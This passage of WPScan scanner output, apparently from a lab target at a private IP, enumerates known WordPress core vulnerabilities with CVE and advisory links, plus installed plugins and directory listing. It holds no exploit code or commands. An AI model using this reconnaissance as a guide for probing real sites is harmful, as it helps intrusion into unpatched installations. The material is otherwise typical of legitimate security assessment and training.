 |      - https://github.com/WordPress/WordPress/commit/a493dc0ab5819c8b831173185f1334b7c3e02e36
 |      - https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c
 |
 | [31m[!][0m Title: WordPress <= 4.5.1 - Pupload Same Origin Method Execution (SOME)
 |     Fixed in: 4.2.8
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8489
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4566
 |      - https://wordpress.org/news/2016/05/wordpress-4-5-2/
 |      - https://github.com/WordPress/WordPress/commit/c33e975f46a18f5ad611cf7e7c24398948cecef8
 |      - https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e
 |
 | [31m[!][0m Title: WordPress 4.2-4.5.2 - Authenticated Attachment Name Stored XSS
 |     Fixed in: 4.2.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8518
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5833
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5834
 |      - https://wordpress.org/news/2016/06/wordpress-4-5-3/
 |      - https://github.com/WordPress/WordPress/commit/4372cdf45d0f49c74bbd4d60db7281de83e32648
 |
 | [31m[!][0m Title: WordPress 3.6-4.5.2 - Authenticated Revision History Information Disclosure
 |     Fixed in: 4.2.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8519
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5835
 |      - https://wordpress.org/news/2016/06/wordpress-4-5-3/
 |      - https://github.com/WordPress/WordPress/commit/a2904cc3092c391ac7027bc87f7806953d1a25a1
 |      - https://www.wordfence.com/blog/2016/06/wordpress-core-vulnerability-bypass-password-protected-posts/
 |
 | [31m[!][0m Title: WordPress 2.6.0-4.5.2 - Unauthorized Category Removal from Post
 |     Fixed in: 4.2.9
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8520
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5837
 |      - https://wordpress.org/news/2016/06/wordpress-4-5-3/
 |      - https://github.com/WordPress/WordPress/commit/6d05c7521baa980c4efec411feca5e7fab6f307c
 |
 | [31m[!][0m Title: WordPress 2.5-4.6 - Authenticated Stored Cross-Site Scripting via Image Filename
 |     Fixed in: 4.2.10
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8615
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7168
 |      - https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/c9e60dab176635d4bfaaf431c0ea891e4726d6e0
 |      - https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html
 |      - https://seclists.org/fulldisclosure/2016/Sep/6
 |
 | [31m[!][0m Title: WordPress 2.8-4.6 - Path Traversal in Upgrade Package Uploader
 |     Fixed in: 4.2.10
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8616
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7169
 |      - https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/54720a14d85bc1197ded7cb09bd3ea790caa0b6e
 |
 | [31m[!][0m Title: WordPress 2.9-4.7 - Authenticated Cross-Site scripting (XSS) in update-core.php
 |     Fixed in: 4.2.11
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8716
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5488
 |      - https://github.com/WordPress/WordPress/blob/c9ea1de1441bb3bda133bf72d513ca9de66566c2/wp-admin/update-core.php
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |
 | [31m[!][0m Title: WordPress 3.4-4.7 - Stored Cross-Site Scripting (XSS) via Theme Name fallback
 |     Fixed in: 4.2.11
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8718
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5490
 |      - https://www.mehmetince.net/low-severity-wordpress/
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/ce7fb2934dd111e6353784852de8aea2a938b359
 |
 | [31m[!][0m Title: WordPress <= 4.7 - Post via Email Checks mail.example.com by Default
 |     Fixed in: 4.2.11
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8719
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5491
 |      - https://github.com/WordPress/WordPress/commit/061e8788814ac87706d8b95688df276fe3c8596a
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |
 | [31m[!][0m Title: WordPress 2.8-4.7 - Accessibility Mode Cross-Site Request Forgery (CSRF)
 |     Fixed in: 4.2.11
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8720
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5492
 |      - https://github.com/WordPress/WordPress/commit/03e5c0314aeffe6b27f4b98fef842bf0fb00c733
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |
 | [31m[!][0m Title: WordPress 3.0-4.7 - Cryptographically Weak Pseudo-Random Number Generator (PRNG)
 |     Fixed in: 4.2.11
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8721
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5493
 |      - https://github.com/WordPress/WordPress/commit/cea9e2dc62abf777e06b12ec4ad9d1aaa49b29f4
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
 |
 | [31m[!][0m Title: WordPress 4.2.0-4.7.1 - Press This UI Available to Unauthorised Users
 |     Fixed in: 4.2.12
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8729
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5610
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
 |      - https://github.com/WordPress/WordPress/commit/21264a31e0849e6ff793a06a17de877dd88ea454
 |
 | [31m[!][0m Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection
 |     Fixed in: 4.2.12
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8730
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611
 |      - https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
 |      - https://github.com/WordPress/WordPress/commit/85384297a60900004e27e417eac56d24267054cb
 |
 | [31m[!][0m Title: WordPress 3.6.0-4.7.2 - Authenticated Cross-Site Scripting (XSS) via Media File Metadata
 |     Fixed in: 4.2.13
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8765
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6814
 |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7
 |      - https://sumofpwn.nl/advisory/2016/wordpress_audio_playlist_functionality_is_affected_by_cross_site_scripting.html
 |      - https://seclists.org/oss-sec/2017/q1/563
 |
 | [31m[!][0m Title: WordPress 2.8.1-4.7.2 - Control Characters in Redirect URL Validation
 |     Fixed in: 4.2.13
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8766
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6815
 |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/288cd469396cfe7055972b457eb589cea51ce40e
 |
 | [31m[!][0m Title: WordPress  4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
 |     Fixed in: 4.2.13
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8768
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6817
 |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8
 |      - https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html
 |
 | [31m[!][0m Title: WordPress 4.2-4.7.2 - Press This CSRF DoS
 |     Fixed in: 4.2.13
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8770
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6819
 |      - https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/263831a72d08556bc2f3a328673d95301a152829
 |      - https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_press_this_function_allows_dos.html
 |      - https://seclists.org/oss-sec/2017/q1/562
 |      - https://hackerone.com/reports/153093
 |
 | [31m[!][0m Title: WordPress 2.3-4.8.3 - Host Header Injection in Password Reset
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8807
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295
 |      - https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
 |      - https://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
 |      - https://core.trac.wordpress.org/ticket/25239
 |
 | [31m[!][0m Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation
 |     Fixed in: 4.2.15
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8815
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9066
 |      - https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |
 | [31m[!][0m Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC
 |     Fixed in: 4.2.15
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8816
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9062
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381
 |
 | [31m[!][0m Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks 
 |     Fixed in: 4.2.15
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8817
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9065
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4
 |
 | [31m[!][0m Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF
 |     Fixed in: 4.2.15
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8818
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9064
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67
 |      - https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_connection_information.html
 |
 | [31m[!][0m Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS
 |     Fixed in: 4.2.15
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8819
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9061
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6
 |      - https://hackerone.com/reports/203515
 |      - https://hackerone.com/reports/203515
 |
 | [31m[!][0m Title: WordPress 3.4.0-4.7.4 - Customizer XSS & CSRF
 |     Fixed in: 4.2.15
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8820
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9063
 |      - https://wordpress.org/news/2017/05/wordpress-4-7-5/
 |      - https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3
 |
 | [31m[!][0m Title: WordPress 2.3.0-4.8.1 - $wpdb->prepare() potential SQL Injection
 |     Fixed in: 4.2.16
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8905
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14723
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
 |      - https://github.com/WordPress/WordPress/commit/fc930d3daed1c3acef010d04acc2c5de93cd18ec
 |
 | [31m[!][0m Title: WordPress 2.3.0-4.7.4 - Authenticated SQL injection
 |     Fixed in: 4.7.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8906
 |      - https://medium.com/websec/wordpress-sqli-bbb2afcc8e94
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/70b21279098fc973eae803693c0705a548128e48
 |      - https://wpvulndb.com/vulnerabilities/8905
 |
 | [31m[!][0m Title: WordPress 2.9.2-4.8.1 - Open Redirect
 |     Fixed in: 4.2.16
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8910
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14725
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/41398
 |
 | [31m[!][0m Title: WordPress 3.0-4.8.1 - Path Traversal in Unzipping
 |     Fixed in: 4.2.16
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8911
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14719
 |      - https://wordpress.org/news/2017/09/wordpress-4-8-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/changeset/41457
 |
 | [31m[!][0m Title: WordPress <= 4.8.2 - $wpdb->prepare() Weakness
 |     Fixed in: 4.2.17
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8941
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16510
 |      - https://wordpress.org/news/2017/10/wordpress-4-8-3-security-release/
 |      - https://github.com/WordPress/WordPress/commit/a2693fd8602e3263b5925b9d799ddd577202167d
 |      - https://twitter.com/ircmaxell/status/923662170092638208
 |      - https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html
 |
 | [31m[!][0m Title: WordPress 2.8.6-4.9 - Authenticated JavaScript File Upload
 |     Fixed in: 4.2.18
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8966
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17092
 |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/67d03a98c2cae5f41843c897f206adde299b0509
 |
 | [31m[!][0m Title: WordPress 1.5.0-4.9 - RSS and Atom Feed Escaping
 |     Fixed in: 4.2.18
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8967
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17094
 |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/f1de7e42df29395c3314bf85bff3d1f4f90541de
 |
 | [31m[!][0m Title: WordPress 3.7-4.9 - 'newbloguser' Key Weak Hashing
 |     Fixed in: 4.2.18
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8969
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17091
 |      - https://wordpress.org/news/2017/11/wordpress-4-9-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/eaf1cfdc1fe0bdffabd8d879c591b864d833326c
 |
 | [31m[!][0m Title: WordPress 3.7-4.9.1 - MediaElement Cross-Site Scripting (XSS)
 |     Fixed in: 4.9.2
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9006
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5776
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9263
 |      - https://github.com/WordPress/WordPress/commit/3fe9cb61ee71fcfadb5e002399296fcc1198d850
 |      - https://wordpress.org/news/2018/01/wordpress-4-9-2-security-and-maintenance-release/
 |      - https://core.trac.wordpress.org/ticket/42720
 |
 | [31m[!][0m Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9021
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
 |      - https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
 |      - https://github.com/quitten/doser.py
 |      - https://thehackernews.com/2018/02/wordpress-dos-exploit.html
 |
 | [31m[!][0m Title: WordPress 3.7-4.9.4 - Remove localhost Default
 |     Fixed in: 4.2.20
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9053
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
 |
 | [31m[!][0m Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
 |     Fixed in: 4.2.20
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9054
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
 |
 | [31m[!][0m Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
 |     Fixed in: 4.2.20
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9055
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
 |
 | [31m[!][0m Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
 |     Fixed in: 4.2.21
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9100
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
 |      - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
 |      - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
 |      - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
 |      - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
 |      - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
 |
 | [31m[!][0m Title: WordPress <= 5.0 - Authenticated File Delete
 |     Fixed in: 4.2.22
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9169
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [31m[!][0m Title: WordPress <= 5.0 - Authenticated Post Type Bypass
 |     Fixed in: 4.2.22
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9170
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
 |
 | [31m[!][0m Title: WordPress <= 5.0 - PHP Object Injection via Meta Data
 |     Fixed in: 4.2.22
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9171
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [31m[!][0m Title: WordPress <= 5.0 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.22
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9172
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [31m[!][0m Title: WordPress <= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
 |     Fixed in: 4.2.22
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9173
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
 |
 | [31m[!][0m Title: WordPress <= 5.0 - User Activation Screen Search Engine Indexing
 |     Fixed in: 4.2.22
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9174
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [31m[!][0m Title: WordPress <= 5.0 - File Upload to XSS on Apache Web Servers
 |     Fixed in: 4.2.22
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9175
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a
 |
 | [31m[!][0m Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
 |     Fixed in: 5.0.1
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9222
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943
 |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
 |      - https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce
 |
 | [31m[!][0m Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)
 |     Fixed in: 4.2.23
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9230
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787
 |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b
 |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/
 |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/
 |
 | [31m[!][0m Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 4.2.24
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9867
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68
 |      - https://hackerone.com/reports/339483
 |
 | [31m[!][0m Title: WordPress <= 5.2.3 - Stored XSS in Customizer
 |     Fixed in: 4.2.25
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9908
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [31m[!][0m Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 4.2.25
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9909
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
 |
 | [31m[!][0m Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
 |     Fixed in: 4.2.25
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9910
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [31m[!][0m Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning
 |     Fixed in: 4.2.25
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9911
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de
 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [31m[!][0m Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation 
 |     Fixed in: 4.2.25
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9912
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2
 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [31m[!][0m Title: WordPress <= 5.2.3 - Admin Referrer Validation
 |     Fixed in: 4.2.25
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9913
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0
 |      - https://blog.wpscan.org/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [31m[!][0m Title: WordPress <= 5.3 - Improper Access Controls
 |     Fixed in: 4.2.26
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9973
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |
 | [31m[!][0m Title: WordPress <= 5.3 - Stored XSS via Crafted Links
 |     Fixed in: 4.2.26
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9975
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20042
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |
 | [31m[!][0m Title: WordPress <= 5.3 - Stored XSS via Block Editor Content
 |     Fixed in: 4.2.26
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9976
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v
 |
 | [31m[!][0m Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
 |     Fixed in: 4.2.26
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/10004
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53

[34m[i][0m The main theme could not be detected.


[34m[i][0m Plugin(s) Identified:

[32m[+][0m advanced-video-embed-embed-videos-or-playlists
 | Location: https://192.168.56.101:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-10-14T13:52:00.000Z
 | Readme: https://192.168.56.101:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
 | [31m[!][0m Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://192.168.56.101:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt

[32m[+][0m akismet
 | Location: https://192.168.56.101:12380/blogblog/wp-content/plugins/akismet/
 | Latest Version: 4.1.3
 | Last Updated: 2019-11-13T20:46:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |
 | [31m[!][0m 1 vulnerability identified:
 |
 | [31m[!][0m Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.1.5
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8215
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
 |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
